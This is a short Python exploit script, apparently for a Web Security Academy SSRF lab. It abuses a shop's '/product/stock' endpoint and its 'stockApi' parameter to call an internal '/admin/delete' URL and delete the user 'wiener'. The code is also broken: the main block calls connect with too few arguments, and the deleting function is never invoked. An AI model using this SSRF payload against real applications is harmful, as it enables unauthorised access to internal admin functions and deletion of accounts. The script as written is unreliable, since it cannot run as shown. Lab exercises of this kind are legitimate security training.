#!/usr/bin/python3

import requests
import sys

def connect(url, api, endpoint):

    data = {
        "test" : "test",
    }

    r = requests.post(url + api, data = data)

    return

def deleteUser(url, api, backend_IP, backend_PORT, admin_range):

    username = "wiener"

    data = {
        "stockApi" : f"http://{backend_IP}{admin_range}:{backend_PORT}/admin/delete?username={username}"
    }

    r = requests.post(url + api, data = data)
    
    if r.status_code == 401:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://ac0c1f501fb50951c0f8412c002900df.web-security-academy.net"
    api = "/product/stock"
    endpoint = "admin"

    connect(url, api)